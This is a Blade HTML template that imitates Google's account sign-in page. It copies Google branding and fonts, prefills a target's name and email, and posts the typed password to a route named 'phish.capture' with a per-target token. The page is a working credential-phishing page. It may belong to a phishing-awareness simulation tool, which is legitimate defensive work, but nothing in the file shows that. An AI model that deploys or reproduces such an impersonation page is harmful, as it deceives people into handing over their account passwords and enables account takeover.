<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Roboto',arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
        .main{width:100%;max-width:450px}
        .card{background:#fff;border-radius:28px;padding:48px 40px 36px;box-shadow:0 1px 3px 0 rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15)}
        .logo-wrap{display:flex;justify-content:center;margin-bottom:8px}
        .logo-wrap svg{height:75px;width:244px}
        h1{font-family:'Google Sans',sans-serif;font-size:24px;font-weight:400;color:#202124;text-align:center;line-height:1.3333;margin-bottom:4px}
        .subtitle{font-size:16px;color:#5f6368;text-align:center;line-height:1.5;margin-bottom:24px}
        .avatar-wrap{display:flex;align-items:center;padding:6px 6px 6px 16px;border:1px solid #dadce0;border-radius:100px;margin-bottom:24px;cursor:pointer;transition:background .15s}
        .avatar-wrap:hover{background:#f7f8f8}
        .avatar{width:32px;height:32px;border-radius:50%;background:#1a73e8;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;margin-right:12px;flex-shrink:0}
        .avatar-text{flex:1;min-width:0}
        .avatar-text .name{font-size:14px;font-weight:500;color:#202124;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        .avatar-text .email{font-size:12px;color:#5f6368;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        .avatar-chevron{width:20px;height:20px;color:#5f6368;margin-left:8px}
        .form-wrap{position:relative}
        .input-wrap{position:relative;margin-bottom:24px}
        .input-wrap input{width:100%;height:56px;padding:13px 15px;font-size:16px;font-family:'Roboto',sans-serif;border:1px solid #dadce0;border-radius:4px;outline:none;background:#fff;color:#202124;transition:border-color .2s,box-shadow .2s}
        .input-wrap input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
        .input-wrap.focused label{font-size:12px;color:#1a73e8;top:-8px;background:#fff;padding:0 4px;left:10px}
        .input-wrap label{position:absolute;top:16px;left:16px;font-size:16px;color:#5f6368;pointer-events:none;transition:all .15s}
        .input-wrap.focused label{top:-8px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8;left:10px}
        .show-pass{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:#5f6368;cursor:pointer;font-size:12px;font-weight:500;font-family:'Google Sans',sans-serif;padding:8px;letter-spacing:.25px}
        .forgot{display:inline-block;font-family:'Google Sans',sans-serif;font-size:14px;font-weight:500;color:#1a73e8;text-decoration:none;padding:8px;margin:-8px 0 16px;letter-spacing:.25px;border-radius:4px;transition:background .15s}
        .forgot:hover{background:rgba(26,115,232,.04)}
        .btn-next{width:100%;height:48px;background:#1a73e8;border:none;border-radius:20px;color:#fff;font-family:'Google Sans',sans-serif;font-size:14px;font-weight:500;letter-spacing:.25px;cursor:pointer;transition:background .15s,box-shadow .15s;margin-top:8px}
        .btn-next:hover{background:#1765cc;box-shadow:0 1px 3px 1px rgba(60,64,67,.15)}
        .divider{display:flex;align-items:center;margin:8px 0 32px}
        .divider::before,.divider::after{content:'';flex:1;height:1px;background:#dadce0}
        .divider span{font-family:'Google Sans',sans-serif;font-size:12px;color:#5f6368;padding:0 16px;letter-spacing:.4px}
        .footer-links{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
        .footer-links a{font-family:'Google Sans',sans-serif;font-size:12px;font-weight:500;color:#1a73e8;text-decoration:none;letter-spacing:.25px;padding:8px;border-radius:4px;transition:background .15s}
        .footer-links a:hover{background:rgba(26,115,232,.04)}
        .footer{margin-top:48px;text-align:center;font-size:12px;color:#5f6368}
        .footer select{background:none;border:none;color:#5f6368;font-size:12px;font-family:'Roboto',sans-serif;cursor:pointer;padding:4px 8px}
        .language-bar{text-align:center;margin-top:16px;font-size:12px;color:#5f6368}
        @media(max-width:480px){.card{padding:24px;border-radius:0;box-shadow:none}}
    </style>
</head>
<body>
    <div class="main">
        <div class="card">
            <div class="logo-wrap">
                <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
                    <g id="qa8jWd">
                        <path d="M15.948 2.977c-2.014 0-4.744 1.122-5.97 2.603h-.062C8.697 4.099 5.967 2.977 3.953 2.977 1.463 2.977 0 5.098 0 7.634v8.732c0 .706.572 1.278 1.278 1.278.706 0 1.278-.572 1.278-1.278V7.634c0-1.328 1.078-2.359 2.4-2.359 1.322 0 2.4 1.031 2.4 2.359v8.732c0 .706.572 1.278 1.278 1.278s1.278-.572 1.278-1.278V7.634c0-1.328 1.078-2.359 2.4-2.359 1.322 0 2.4 1.031 2.4 2.359v8.732c0 .706.572 1.278 1.278 1.278.706 0 1.278-.572 1.278-1.278V7.634c0-2.536-1.463-4.657-3.953-4.657z" fill="#4285F4"/>
                        <path d="M33.963 7.44c-2.292 0-4.168 1.876-4.168 4.168 0 2.292 1.876 4.168 4.168 4.168 2.292 0 4.168-1.876 4.168-4.168 0-2.292-1.876-4.168-4.168-4.168zm0 6.663c-1.377 0-2.495-1.118-2.495-2.495s1.118-2.495 2.495-2.495c1.377 0 2.495 1.118 2.495 2.495s-1.118 2.495-2.495 2.495z" fill="#EA4335"/>
                        <path d="M53.217 7.44c-2.292 0-4.168 1.876-4.168 4.168 0 2.292 1.876 4.168 4.168 4.168s4.168-1.876 4.168-4.168c0-2.292-1.876-4.168-4.168-4.168zm0 6.663c-1.377 0-2.495-1.118-2.495-2.495s1.118-2.495 2.495-2.495c1.377 0 2.495 1.118 2.495 2.495s-1.118 2.495-2.495 2.495z" fill="#FBBC05"/>
                        <path d="M74.472 7.44c-2.292 0-4.168 1.876-4.168 4.168 0 2.292 1.876 4.168 4.168 4.168s4.168-1.876 4.168-4.168c0-2.292-1.876-4.168-4.168-4.168zm0 6.663c-1.377 0-2.495-1.118-2.495-2.495s1.118-2.495 2.495-2.495c1.377 0 2.495 1.118 2.495 2.495s-1.118 2.495-2.495 2.495z" fill="#34A853"/>
                        <path d="M41.249 3.28v13.843c0 1.702-1.379 3.081-3.081 3.081s-3.081-1.379-3.081-3.081V3.28c0-.706-.572-1.278-1.278-1.278s-1.278.572-1.278 1.278v13.843c0 3.114 2.527 5.641 5.641 5.641s5.641-2.527 5.641-5.641V3.28c0-.706-.572-1.278-1.278-1.278s-1.278.572-1.278 1.278z" fill="#4285F4"/>
                        <path d="M13.85 1.278C13.144 1.278 12.572.706 12.572 0S13.144-1.278 13.85-1.278c.706 0 1.278.572 1.278 1.278s-.572 1.278-1.278 1.278z" fill="#EA4335"/>
                        <path d="M0 15.11v3.828c0 .706.572 1.278 1.278 1.278.706 0 1.278-.572 1.278-1.278V15.11c0-.706-.572-1.278-1.278-1.278S0 14.404 0 15.11z" fill="#FBBC05"/>
                        <path d="M20.59 3.28v13.843c0 1.702-1.379 3.081-3.081 3.081s-3.081-1.379-3.081-3.081V3.28c0-.706-.572-1.278-1.278-1.278s-1.278.572-1.278 1.278v13.843c0 3.114 2.527 5.641 5.641 5.641s5.641-2.527 5.641-5.641V3.28c0-.706-.572-1.278-1.278-1.278s-1.278.572-1.278 1.278z" fill="#34A853"/>
                    </g>
                </svg>
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>

            <form action="{{ route('phish.capture', ['provider' => 'google', 'token' => $token]) }}" method="POST" id="loginForm">
                @csrf
                <div class="avatar-wrap" tabindex="0">
                    <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
                    <div class="avatar-text">
                        <div class="name">{{ $name }}</div>
                        <div class="email">{{ $email }}</div>
                    </div>
                    <svg class="avatar-chevron" viewBox="0 0 24 24" fill="currentColor"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
                </div>

                <div class="form-wrap">
                    <div class="input-wrap" id="passWrap">
                        <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
                        <label for="password" id="passLabel">Enter your password</label>
                        <button type="button" class="show-pass" onclick="togglePass()">Show</button>
                    </div>

                    <a href="#" class="forgot">Forgot password?</a>

                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>

            <div class="divider"><span>or</span></div>

            <div class="footer-links">
                <a href="#">Create account</a>
                <a href="#">Learn more</a>
            </div>
        </div>

        <div class="footer">
            <select>
                <option>English (United States)</option>
                <option>Español</option>
                <option>Deutsch</option>
                <option>Français</option>
            </select>
            <div style="margin-top:8px">© 2026 Google</div>
        </div>
    </div>

    <script>
        var passInput = document.getElementById('password');
        var passWrap = document.getElementById('passWrap');

        passInput.addEventListener('focus', function() {
            passWrap.classList.add('focused');
        });
        passInput.addEventListener('blur', function() {
            if (!this.value) passWrap.classList.remove('focused');
        });
        if (passInput.value) passWrap.classList.add('focused');

        function togglePass() {
            var btn = document.querySelector('.show-pass');
            if (passInput.type === 'password') {
                passInput.type = 'text';
                btn.textContent = 'Hide';
            } else {
                passInput.type = 'password';
                btn.textContent = 'Show';
            }
        }
    </script>
</body>
</html>
